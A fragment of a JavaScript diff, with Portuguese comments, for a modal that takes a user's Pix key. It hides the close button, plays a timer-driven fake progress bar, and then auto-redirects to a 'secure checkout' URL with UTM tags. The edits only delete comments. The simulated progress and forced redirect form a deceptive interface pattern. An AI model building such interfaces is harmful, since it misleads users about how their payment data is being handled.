         const chave = pixKeyInput.value.trim();
         if (!chave) return;
 
-        // Oculta botão de fechar durante o processamento
         modalCloseBtn.style.display = 'none';
-
-        // Muda para Step 2
         step1.style.display = 'none';
         step2.style.display = 'block';
 
@@ -1557,7 +2389,6 @@
         progressInterval = setInterval(() => {
           elapsedMs += 40;
 
-          // Etapa 1 completa (após 1.2s)
           if (elapsedMs >= 1200 && elapsedMs < 2400) {
             percent = 65;
             progressBarFill.style.width = percent + '%';
@@ -1580,7 +2411,6 @@
             `;
           }
 
-          // Etapa 2 completa (após 2.4s)
           if (elapsedMs >= 2400 && elapsedMs < 3600) {
             percent = 90;
             progressBarFill.style.width = percent + '%';
@@ -1603,16 +2433,13 @@
             `;
           }
 
-          // Transição para Etapa 3 (após 3.6s)
           if (elapsedMs >= 3600) {
             clearInterval(progressInterval);
             step2.style.display = 'none';
             step3.style.display = 'block';
 
-            // Atualiza href com UTMs dinâmicas
             redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
 
-            // Contagem decrescente de redirecionamento (4 segundos)
             let redirectSeconds = 4;
             redirectCountdownText.textContent = `Redirecionando para o checkout seguro em ${redirectSeconds}s...`;
 
